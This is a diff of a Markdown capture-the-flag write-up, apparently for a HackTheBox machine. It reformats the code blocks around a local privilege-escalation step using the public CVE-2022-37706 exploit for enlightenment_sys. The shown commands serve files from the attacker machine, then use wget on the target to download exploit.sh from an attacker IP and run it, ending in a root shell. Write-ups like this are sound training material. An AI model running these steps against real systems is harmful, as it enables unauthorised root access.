@@ -293,11 +293,13 @@ enlightenment_sys in Enlightenment versions before 0.25.4 . This vulnerability a
 users to gain elevated privilege. We also came across the Poc [exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit). We'll download it to our local macine and transfer it to the box.
 
 ```bash
-#On our attacker machine
+# On our attacker machine
 
 python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
+```
 
+```bash
 # On the box
 larissa@boardlight:~$ wget http://10.10.16.18/exploit.sh
 larissa@boardlight:~$ chmod +x exploit.sh
@@ -312,5 +314,6 @@ CVE-2022-37706
 mount: /dev/../tmp/: can't find in /etc/fstab.
 # whoami
 root
+```
 
 
